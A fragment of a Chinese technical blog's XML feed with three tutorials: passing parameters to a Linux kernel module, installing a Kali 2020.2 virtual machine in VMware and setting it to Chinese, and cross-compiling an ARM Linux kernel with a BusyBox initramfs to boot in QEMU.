data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvUHNMdVJGSGlNTzZRbXJYLnBuZw" alt="image-20200608113816662">  </p><p>也可通过 modinfo 命令进一步检查 :</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvRE9GTXp1dHNtS3BuWUxhLnBuZw" alt="image-20200608114046227"></p><h5 id="5-插入模块"><a href="#5-插入模块" class="headerlink" title="5.插入模块"></a>5.插入模块</h5><p>通过 insmod 命令插入模块，完成插入后可通过 lsmod 命令查看当前模块是否已经被加载到系统中:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvM1NQVXhhbXFpQ2R2T0dGLnBuZw" alt="image-20200608115103707"></p><p>系统加载模块后，也会在“/sys/module”目录下新建以模块名命名的目录 :</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvSFlVTU5ramJHbW82Q252LnBuZw" alt="image-20200608115252879"></p><h5 id="6-查看输出"><a href="#6-查看输出" class="headerlink" title="6.查看输出"></a>6.查看输出</h5><p>   因 本 演示 中 prink()采 用 默认 输出 等级 ，可 通 过“ dmesg” 或“ tail /var/log/kern.log”命令查看输出结果。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNzVqdWdBcE9XRVNNeWFULnBuZw" alt="image-20200608115615691"></p><p>“  tail /var/log/kern.log”命令查看输出结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvSkM3bnBWa3h2RXNoR2xXLnBuZw" alt="image-20200608115832820"></p><h5 id="7-卸载模块"><a href="#7-卸载模块" class="headerlink" title="7. 卸载模块"></a>7. 卸载模块</h5><p>   卸载模块，可通过“rmmod 模块名”实现，通 过“ tail /var/log/kern.log”命令查看输出结果。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvdlJVSkZsemptdVNpSURyLnBuZw" alt="image-20200608120215696"></p><h4 id="二、-模块参数"><a href="#二、-模块参数" class="headerlink" title="二、 模块参数"></a>二、 模块参数</h4><h5 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h5><p>Linux 内核提供一个宏来实现模块的参数传递</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> module_param(name, type, perm) \</span></span><br><span class="line"><span class="meta">module_param_named(name, name, type, perm)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULE_PARM_DESC(_parm, desc) \</span></span><br><span class="line"><span class="meta">_MODULE_INFO(parm, _parm, #_parm <span class="string">":"</span> desc);</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>module_param()宏由 3 个参数组成，name 表示参数名，type 表示参数类型，perm 表示参数读写权限。MODULE_PARM_DESC()宏提供参数的简单说明，参数类型可为 byte、short、int、long、char、bool 等类型；perm 指定在 sysfs 中相应文件的访问权限，如设置为 0 则不会出现在 sysfs 文件系统中，设置为 0644 标识 root 用户可修改本参数。  </p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> debug = <span class="number">1</span>;</span><br><span class="line">module_param(debug, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(debug, <span class="string">"enable debugging information"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dprintk(args...) <span class="keyword">if</span>(debug){printk(KERN_DEBUG args);}</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>如上述实际代码所示（driver/misc/altera-stap1/altera.c），实际定义模块参数 debug,类型是 int,访问权限是 0644。参数用途是大概调试信息，实际内核编程中常用此方法进行内核调试。  </p></blockquote><h5 id="2-开始动手"><a href="#2-开始动手" class="headerlink" title="2.开始动手"></a>2.开始动手</h5><p>修改上文中的“hello_module.c”文件，改为以下内容：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello_module.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> debug = <span class="number">1</span>;</span><br><span class="line">module_param(debug, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(debug, <span class="string">"debugging information"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dprintk(args...) <span class="keyword">if</span>(debug){printk(KERN_DEBUG args);}</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myparm = <span class="number">10</span>;</span><br><span class="line">module_param(myparm, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(myparm, <span class="string">"kernel module parameter experiment."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">parm_init</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   dprintk(<span class="string">"my linux kernel module init.\n"</span>);</span><br><span class="line">   dprintk(<span class="string">"module parameter = %d\n"</span>, myparm);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">parm_exit</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"see you next time!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(parm_init);</span><br><span class="line">module_exit(parm_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Q"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"kernel module paramter experiment"</span>);</span><br><span class="line">MODULE_ALIAS(<span class="string">"myparm"</span>);</span><br></pre></td></tr></tbody></table></figure><p>make编译，装载模块，并查看输出:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvV1p0QlZEQ1g3R25SZTlsLnBuZw" alt="image-20200608122047862"></p><blockquote><p>通过查看日志信息，可发现输出以上程序中 参数 的默认值。  </p></blockquote><p>卸载模块，赋值重新加载模块,修改参数 myparm 值为 116：  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod parm_module.ko myparm=116  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvZjdXNnF0ZGtVRDRPTDlvLnBuZw" alt="image-20200608122350054"></p><blockquote><p>通过查看日志信息，可发现 参数 值已经改变。  </p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> linux </tag>
        
            
            
        <tag> kernel </tag>
        
            
            
        <tag> c </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>VMware虚拟机安装kali 2020.2</title>
      
      
      <link href="/cn/posts/55435/"/>
      
      
      <url>/cn/posts/55435/</url>
      
      
        
      <content type="html"><![CDATA[<p>1.打开Kali官网下载镜像,这里直接选择VMware</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvNnFYMk0zZWtpS0p4VzdBLnBuZw.png" alt="image-20200522151450024"></p><p>2.解压然后在VMware中点击”文件-打开”导入虚拟机</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvczRDMVNWbmlmb0ljUUU3LnBuZw.png" alt="image-20200522152239751"></p><p>3.点编辑设置打开虚拟化选项(没有此选项的点击升级此虚拟机,还没有的就检查BIOS设置)</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvVklyZ2VzVVlTa3k4M3Z0LnBuZw.png" alt="image-20200522152710641"></p><p>4.点击开启此虚拟机,用户名和密码在虚拟机描述里有(2020版用户名和密码都是kali)</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvSXNRdzJEMUNBbjRZcTdsLnBuZw.png" alt="image-20200522153301414"></p><p>5.设置kali语言为中文</p><p>虚拟机默认语言为英文</p><p>设置步骤如下</p><p>(1)终端输入代码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg-reconfigure locales</span><br></pre></td></tr></tbody></table></figure><p>然后选择字符编码： en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8 （用空格选定）</p><p>接着选择字符： zh_CN.UTF-8 选定后回车确认</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvUlFqdnVicGkzeGhWR1NjLnBuZw.png" alt="image-20200522155355777"></p><p>(2)接着输入如下代码安装字体,如果没有成功看(3)</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>(3)换阿里云源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/apt/sources.list</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>或者图形化:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mousepad  /etc/apt/sources.list</span><br></pre></td></tr></tbody></table></figure><p>先备份原文并将这一段覆盖原文</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aliyun </span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></tbody></table></figure><p>更新源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update </span><br></pre></td></tr></tbody></table></figure><p>(4)重启后就变为中文了</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> kali </tag>
        
            
            
        <tag> 虚拟机 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Linux内核的编译</title>
      
      
      <link href="/cn/posts/2461/"/>
      
      
      <url>/cn/posts/2461/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>常见 Linux 内核编译有两种方式，一是直接在 Linux 系统上编译得到二进制文件，并对原有 Linux 内核进行替换，即更换 Linux 内核，此方法可能因新内核有 bug 导致系统奔溃，且难以返回原版本内核而不得不重装；第二种方法则是在模拟器中运行新的 Linux 内核，以避免对系统内核的修改。</p><p>BusyBox 是一个集成了三百多个最常用 Linux 命令和工具的软件，因为单独的 Linux 内核无任何用于用户交互的 UI，所以需要通过其它工具与新编译的Linux 内核交互。</p><p>QEMU 是以 GPL 许可证分发源码的模拟处理器，可用于模拟常见的硬件平台，常用于在 Linux 系统中建立虚拟机。</p><p>本文在阿里云 Ubuntu 18.04 64 位操作系统环境下编译 ARM Linux 内核。过程中主要是用交叉编译工具链 gcc-arm-linux-gnueabi 编译系统源码，并使用 QEMU 软件仿真硬件平台测试对象系统。</p><p>**建议使用 root 用户操作  **</p></blockquote><p><strong>本文所使用的环境：</strong></p><blockquote><p>操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p>gcc: 7.5.0</p><p>qemu: 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.26)</p><p>make:GNU Make 4.1</p></blockquote><ol><li><h5 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h5><p>Busybox 需手动下载安装，QEMU 等其他工具可在线安装。  </p><p>Linux内核下载：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p>本文使用5.4.45版本的,并使用清华大学镜像</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p>Busybox ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.28.4.tar.bz2</span><br></pre></td></tr></tbody></table></figure></li><li><p>环境配置</p><p>Linux 内核编译环境需要大量软件包，可提前直接在线安装，或在内核编译的过程中安装，若缺少安装包，内核编译过程中会提示缺失错误。以下是部分需要的软件包，其中部分相同功能的软件包在不同的 Linux 版本下会以不同的名字存在。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc qemu qemu-system-arm gcc-arm-linux-gnueabi libncurses5-dev build-essential flex bison bc  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvbnZ6d0ViUDZjMzVObDh0LnBuZw.png" alt="image-20200607225302378"></p></li><li><h5 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h5><p><strong>解压 Linux 内核文件包：</strong> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf linux-5.4.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p><strong>编译最小文件系统：</strong>  </p><p>解压 busybox,进入目录并编译:  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -jxvf busybox-1.28.4.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.28.4</span><br><span class="line"><span class="built_in">export</span> ARCH=arm</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make menuconfig</span><br></pre></td></tr></tbody></table></figure><p>以上内容中，“export”后是指定交叉编译工具链，指定芯片框架为 ARM。如下图所示是图形化界面进行内核配置。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvb0wydXdBSGtNOHJmSVVSLnBuZw.png" alt="image-20200607231737776"></p><blockquote><p>按照以下路径配置成静态编译（回车进入，空格选中） ：</p><p>Settings —-&gt;</p><p>　　Build Options<br>　　　　　　　[*]Build static binary(no shared libs)  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvVGhwZW9meEh6REttQnZuLnBuZw.png" alt="image-20200607232057964"></p></blockquote><p>配置完毕退出后继续完成编译：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install  </span><br></pre></td></tr></tbody></table></figure><p>完成后会在目录中生成“_install”目录，本目录存放了编译好的文件系统需要的命令集合，如下图所示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvRWM3MWZ6bjU4aEJRVlkyLnBuZw.png" alt="image-20200607233324632">  </p><p>将上一步骤中生成的“_install”目录拷贝至之前解压后的内核目录，进入“_install”目录，分别创建 etc、dev、mnt、etc/init.d 等目录。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r ./busybox-1.28.4/_install ./linux-5.4.5/_install</span><br><span class="line"><span class="built_in">cd</span> ./linux-5.4.5/_install/</span><br><span class="line"><span class="built_in">mkdir</span> etc</span><br><span class="line"><span class="built_in">mkdir</span> dev</span><br><span class="line"><span class="built_in">mkdir</span> mnt</span><br><span class="line"><span class="built_in">mkdir</span> -p etc/init.d</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvVlR2RFJzNjlKN0lGdVFOLnBuZw.png" alt="image-20200607234014872"></p><p>在“_install/etc/init.d”目录下新建“rcS”文件，并写入以下内容：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /sys</span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev –s  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvYnZTb1R0T0VuZ1BobTdKLnBuZw.png" alt="image-20200607234356567"></p><p>在“_install/etc”目录创建“fstab”文件，并写入以下内容：  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tempfs /dev tmpfs defaults 0 0</span><br><span class="line">debugfs /sys/kernel/debug debugfs defaults 0 0  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvOFNVTlBqbFl6aWhWREJBLnBuZw.png" alt="image-20200607234653102"></p><p>在“_install/etc”目录创建“inittab”文件，并写入以下内容：  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvS3ZOcGJaaUNUT1dxSHRhLnBuZw.png" alt="image-20200607234926195"></p><p>在“_install/dev”目录中创建如下设备节点。 ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> console c 5 1</span><br><span class="line"><span class="built_in">mknod</span> null c 1 3  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNzV6aU04YUxyU0QyZXV2LnBuZw.png" alt="image-20200607235200236"></p><p>完成上述设置后，在内核目录中编译内核 ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ARCH=arm</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make vexpress_defconfig</span><br><span class="line">make menuconfig  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvdWJsUmNaVDlxVmZFRjROLnBuZw.png" alt="image-20200607235445654"></p><blockquote><p>make menuconfig 设置中，按照以下路径，在 initramfs source file 中填入“_install”(按回车填入) :<br>General setup —-&gt;<br>　　　　　　 [*]Initial RAM filesystem and RAM disk (initramfs/initrd) support<br>　　　　　　　　　　　(_install)Initramfs source file(s)  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvYXN3NkpOT3hISUVvbWJqLnBuZw.png" alt="image-20200607235912353"></p><p>返回上一层，在</p><p>Boot option  —-&gt;<br>　　　　()Default kernel command string  </p><p>回车进入 Default kernel command string 并清 空 。 下 图 中 删 除 原 有 内 容 用<br>Ctl+Backspace 键。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvT0FGN3UyRWhLQ1dVWTZWLnBuZw.png" alt="image-20200608000442154"></p><p>配置 memory split 为“3G/1G user/kernel split”,并打开High Memory Support：</p><p>Kernel features —-&gt;<br>　　　　Memory split(3G/1G user/kernel split) -<br>　　　　[*] High Memory Support  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgveGRBTERNSUd5c2lyTmE2LnBuZw.png" alt="image-20200608000716572"></p></blockquote><p>在内核目录下编译内核(此步骤时间较长)  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make bzImage ARCH=arm CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make dtbs </span><br></pre></td></tr></tbody></table></figure><blockquote><p>可能会出现“./usr/gen_initramfs_list.sh: 131: local: 1: bad variable name”的错误，原因是以前用的bash执行而现在使用sh。</p><p>解决办法：131行改为 ：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local dev="`LC_ALL=C ls -l "${location}"`"</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvcllBbTQ1blJNOUtVdXBaLnBuZw.png" alt="image-20200608093024179"></p></blockquote><p>编译完成后会有如下提示，并显示编译后内核的存储路径。 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvd3NTNkJ1eVV6ckdaZVEyLnBuZw.png" alt="image-20200608003409578"></p></li><li><h5 id="运行-QEMU"><a href="#运行-QEMU" class="headerlink" title="运行 QEMU"></a>运行 QEMU</h5><p>如下所示，输入 QEMU 启动命令，成功启动 QEMU，注意需指定 bzImage路径，并注意使用当前命令与 bzImage 路径的关系。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M vexpress-a9 -m 256M -kernel <span class="built_in">arch</span>/arm/boot/zImage -append <span class="string">"rdinit=/linuxrc console=ttyAMA0 loglevel=8"</span> -dtb <span class="built_in">arch</span>/arm/boot/dts/vexpress-v2p-ca9.dtb -nographic  </span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上命令中参数含义如下；<br>-M：指定硬件芯片框架<br>-m：指定运行内存大小<br>-kernel：指定运行的内核镜像<br>-dtb：指定具体芯片的配置信息<br>-nographic：指定不使用图形界面  </p></blockquote></li><li><h5 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h5><p>如下图可以看到，成功运行了我们刚刚编译的新内核</p><p><img src= 